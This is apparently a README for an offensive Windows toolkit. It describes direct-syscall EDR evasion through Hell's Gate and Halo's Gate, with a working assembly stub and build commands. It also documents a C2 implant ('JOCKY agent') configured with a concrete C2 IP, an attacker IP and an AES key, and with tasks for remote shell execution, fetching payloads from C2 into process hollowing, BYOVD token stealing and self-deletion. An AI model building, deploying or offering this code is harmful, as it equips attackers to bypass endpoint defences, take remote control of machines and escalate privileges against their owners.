# directSyscall

Direct syscall implementation for Windows x64 with a three-tier SSN resolution fallback: Hell's Gate → Halo's Gate → fresh ntdll copy from disk.

The goal is to invoke NT native functions without going through ntdll's userland stubs, bypassing EDR hooks that sit in ntdll's address space.

---

## How it works

### SSN resolution (`hellsgate.h`)

To call a syscall directly you need its **System Service Number (SSN)** — the integer `eax` is loaded with before the `syscall` instruction fires. ntdll stubs follow a predictable layout:

```
mov r10, rcx        ; 4C 8B D1
mov eax, <SSN>      ; B8 xx xx xx xx   ← SSN at offset +4
syscall / jmp       ; ...
```

Three resolution strategies are tried in order:

| Strategy | Trigger | Mechanism |
|---|---|---|
| **Hell's Gate** | Stub is clean | Reads `*(DWORD*)(stub + 4)` from in-memory ntdll |
| **Halo's Gate** | Stub is hooked (starts with `0xE9` JMP) | Walks neighbouring stubs (±32 bytes each) to find an unhooked one, then subtracts/adds the delta |
| **Fresh copy** | Both in-memory strategies fail | Maps ntdll directly from `C:\Windows\System32\ntdll.dll` on disk, parses the export table, and reads the SSN from the clean on-disk image |

### Syscall stub (`syscall_stub.asm`)

The assembly stub remaps arguments from the Windows x64 calling convention to the kernel syscall ABI and issues the `syscall` instruction directly:

```asm
; Windows x64 on entry:  rcx=ssn  rdx=A1  r8=A2  r9=A3  [rsp+28h]=A4 ...
; Kernel syscall ABI:    eax=ssn  r10=A1  rdx=A2  r8=A3  r9=A4        ...
DirectSyscall PROC
    mov r10, rdx        ; A1 → r10
    mov eax, ecx        ; SSN → eax
    mov rdx, r8         ; A2 → rdx
    mov r8,  r9         ; A3 → r8
    mov r9,  [rsp+28h]  ; A4 → r9
    ; shift A5/A6 down one slot for the kernel
    mov r11, [rsp+30h]
    mov [rsp+28h], r11
    mov r11, [rsp+38h]
    mov [rsp+30h], r11
    syscall
    ret
DirectSyscall ENDP
```

### Demo (`main.cpp`)

Resolves `NtAllocateVirtualMemory` through the three-tier fallback and calls it directly:

```cpp
DWORD ssn = ResolveSSN("NtAllocateVirtualMemory");
NTSTATUS status = DirectSyscall(ssn, hProcess, &baseAddress, 0,
                                 &regionSize, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_READWRITE);
```

---

## Files

| File | Purpose |
|---|---|
| `hellsgate.h` | SSN resolution: Hell's Gate, Halo's Gate, fresh-copy fallback |
| `syscall_stub.asm` | x64 MASM stub — argument remapping + `syscall` instruction |
| `main.cpp` | Standalone demo: resolve + call `NtAllocateVirtualMemory` |
| `agent.cpp` | JOCKY C2 agent that uses this infrastructure (WinHTTP C2, AES-256-CBC payload decrypt, process hollowing, shell relay, BYOVD, self-destruct) |

---

## Build

**Prerequisites:** MSVC + Windows SDK (for `ml64.exe`)

```bat
rem Assemble the syscall stub first
ml64 /c syscall_stub.asm /Fo syscall_stub.obj

rem Build the demo
cl /nologo /O2 /MT main.cpp syscall_stub.obj /link /SUBSYSTEM:CONSOLE /OUT:main.exe kernel32.lib

rem Build the full agent (requires byovd and processhollowing TUs)
cl /nologo /O2 /MT agent.cpp ^
   ..\byovd\client\client.cpp ^
   ..\processhollowing\hollow.cpp ^
   syscall_stub.obj ^
   /link /SUBSYSTEM:CONSOLE /OUT:jocky_agent.exe ^
   ws2_32.lib winhttp.lib crypt32.lib bcrypt.lib kernel32.lib advapi32.lib ntdll.lib
```

**Agent compile-time overrides:**

```bat
/DC2_HOST=L"65.1.92.74"
/DC2_PORT=443
/DPOLL_INTERVAL_MS=30000
/DATTACKER_IP="10.0.2.15"
/DAES_KEY_HEX="6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
```

---

## Agent task dispatch

`agent.cpp` implements the JOCKY implant side of the C2 protocol. After registration it runs a polling loop:

- **`shell`** — executes a `cmd.exe /C` command, returns stdout/stderr
- **`hollow`** — fetches encrypted payload from C2, AES-decrypts it, patches the attacker IP placeholder, writes to `C:\Windows\Temp\payload.exe`, injects via process hollowing
- **`byovd`** — triggers the kernel driver pipeline (token stealing / callback removal via the vulnerable driver)
- **`self_destruct`** — deletes the payload from disk and schedules its own binary for deletion via a deferred `cmd.exe` after exit
